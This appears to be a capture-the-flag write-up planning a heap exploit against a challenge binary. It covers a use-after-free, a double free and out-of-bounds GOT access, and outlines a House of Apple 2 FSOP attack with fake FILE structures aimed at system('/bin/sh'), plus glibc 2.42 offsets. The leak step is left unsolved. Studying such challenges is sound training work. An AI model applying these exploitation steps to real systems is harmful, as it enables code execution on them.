# Crazy FSOP - Complete Analysis

## Vulnerabilities Discovered

1. **Out-of-bounds array access** - No bounds check on `idx` parameter
2. **Use-after-free** - Can view freed chunks via `view(idx)`
3. **Double-free** - Can free same chunk multiple times
4. **No size validation** - Can allocate size 0 or very large

## Memory Layout

```
.got:   0x3f78 - 0x4000
.data:  0x4000 - 0x4010
.bss:   0x4020 - 0x40c0
notes:  0x4040
```

## GOT Access via Negative Indices

```
notes[-22] = free@got    @ 0x3f90
notes[-21] = puts@got    @ 0x3f98
notes[-18] = printf@got  @ 0x3fb0
notes[-14] = malloc@got  @ 0x3fd0
```

## Critical Challenge: Leak Issues

The `view()` function uses `printf("%s", notes[idx])` which:
- Stops at null bytes (`\x00`)
- Libc addresses often have leading null bytes
- Unsorted bin fd/bk pointers have null bytes
- Makes traditional heap/libc leaks difficult

## Solutions to Leak Problem

### Option 1: Leak from filled chunks
Before freeing a chunk, fill it with non-null data:
```python
create(io, 0, 0x100, b'\x01' * 0x100)  # No nulls
delete(io, 0)  # Now fd might be readable if no leading nulls
view(io, 0)
```

### Option 2: Leak from GOT after lazy binding
```python
# Trigger function call to resolve GOT
create(io, 0, 0x20, b'test')
view(io, 0)  # This calls puts, resolving puts@got

# Now leak - but GOT might still have null bytes
leak = view(io, -21)  # puts@got
```

### Option 3: Use heap metadata
Tcache chunks use safe-linking in glibc 2.32+:
- `fd = (next >> 12) ^ chunk_addr`
- The mangled pointer might not have leading nulls
- Can potentially leak and demangle

### Option 4: Partial overwrites
Instead of full ASLR bypass:
- Use partial overwrites (1-2 bytes)
- Brute force remaining bits
- Simpler for CTF context

## FSOP Attack Plan (Once Leaks Work)

### House of Apple 2 for glibc 2.42

1. **Leak libc base** (solve null byte issue)
2. **Leak heap base** (for safe-linking bypass)
3. **Create fake FILE structure**:
```python
fake_file = {
    0x00: 0,  # _flags
    0x20: 0,  # _IO_write_base
    0x28: 1,  # _IO_write_ptr
    0xa0: fake_wide_data_addr,
    0xd8: _IO_wfile_jumps,
}
```

4. **Create fake _wide_data**:
```python
fake_wide_data = {
    0x18: 0,  # _IO_write_base
    0x20: 1,  # _IO_write_ptr
    0x30: binsh,  # _IO_buf_base (arg to system)
    0xe0: system,  # __doallocate function pointer
}
```

5. **Tcache poisoning to overwrite _IO_list_all**
6. **Trigger via exit()**

## Alternative: Direct GOT Overwrite

If we can solve the leak problem, simpler approach:

1. Leak libc
2. Calculate system address
3. Use tcache poisoning to allocate at printf@got or puts@got
4. Write system address
5. Trigger with "/bin/sh" argument

## Key Files

- `solve_final.py` - Full FSOP exploit (needs leak fix)
- `chal.c` - Source code
- `libc.so.6` - glibc 2.42
- `chal` - Binary

## Next Steps

1. Fix leak primitive to handle null bytes
2. Test locally if possible (needs Linux/WSL)
3. Adjust heap layout calculations
4. Fine-tune FSOP payload for glibc 2.42
5. Test against remote

## libc 2.42 Specific Offsets

```
_IO_list_all: 0x2354c0
_IO_2_1_stderr_: 0x2354e0
_IO_wfile_jumps: 0x233228
system: 0x5c4c0
```
